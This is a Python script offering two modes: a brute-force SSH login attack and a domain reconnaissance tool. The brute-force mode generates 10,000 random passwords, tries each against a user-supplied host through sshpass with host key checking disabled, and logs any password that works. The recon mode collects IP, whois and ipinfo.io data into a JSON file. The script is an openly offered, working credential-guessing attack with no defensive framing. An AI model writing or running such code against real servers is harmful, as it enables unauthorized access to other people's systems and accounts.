import socket
import subprocess
import os
import sys
import time
import requests
import logging
import random
import string
import whois
import json

logging.basicConfig(filename='bruteforce_success.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')


def get_ip_address(domain):
    try:
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.gaierror:
        return None


def get_domain_info(domain):
    try:
        domain_info = whois.whois(domain)
        return domain_info
    except Exception as e:
        return str(e)


def get_server_info(ip_address):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        return response.json()
    except requests.RequestException as e:
        return str(e)


def prompt_for_input():
    domain = input("Please enter a domain: ")
    username = input("Enter Username: ")
    return domain, username


def generate_passwords(filename, count=10000, length=8):
    characters = string.ascii_letters + string.digits
    with open(filename, 'w') as f:
        for _ in range(count):
            password = ''.join(random.choice(characters) for _ in range(length))
            f.write(password + '\n')


def brute_force(ip_address, username, wordlist_path):
    if not os.path.isfile(wordlist_path):
        print("Error: Wordlist file not found!")
        sys.exit(1)
    elif not os.access(wordlist_path, os.R_OK):
        print("Error: Wordlist file is not readable!")
        sys.exit(1)

    if subprocess.run(["which", "sshpass"], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode != 0:
        print("Error: sshpass is not installed. Please install it and try again.")
        sys.exit(1)

    with open(wordlist_path, 'r') as wordlist:
        for password in wordlist:
            password = password.strip()
            print(f"Trying password: {password}")
            result = subprocess.run(["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5", f"{username}@{ip_address}", "exit"])
            if result.returncode == 0:
                print(f"Password found: {password}")
                logging.info(f"Password found for {username}@{ip_address}: {password}")
                sys.exit(0)
            elif result.returncode == 5:
                print("Connection refused or timeout")
                sys.exit(1)
            time.sleep(1)

    print("Password not found.")
    sys.exit(1)


def save_to_json(domain, domain_info, server_info):
    data = {
        'domain': domain,
        'domain_info': domain_info,
        'server_info': server_info
    }
    with open('protecth.json', 'w') as json_file:
        json.dump(data, json_file, indent=2)


def main():
    print("Choose an option:")
    print("1. Brute Force")
    print("2. Web")

    choice = input("Enter your choice (1 or 2): ")

    if choice == '1':
        domain, username = prompt_for_input()
        wordlist_path = f'{username}_rockyou.txt'
        generate_passwords(wordlist_path)
        ip_address = get_ip_address(domain)
        if not ip_address:
            print(f"{domain}: Unable to find IP address")
            sys.exit(1)
        brute_force(ip_address, username, wordlist_path)

    elif choice == '2':
        domain = input("Please enter a domain: ")
        ip_address = get_ip_address(domain)
        if ip_address:
            print(f"{domain}: {ip_address}")
            domain_info = get_domain_info(domain)
            server_info = get_server_info(ip_address)
            print(f"Domain Info: {domain_info}")
            print(f"Server Info: {json.dumps(server_info, indent=2)}")
            save_to_json(domain, domain_info, server_info)
        else:
            print(f"{domain}: Unable to find IP address")

    else:
        print("Invalid choice. Please enter 1 or 2.")
        sys.exit(1)


if __name__ == '__main__':
    main()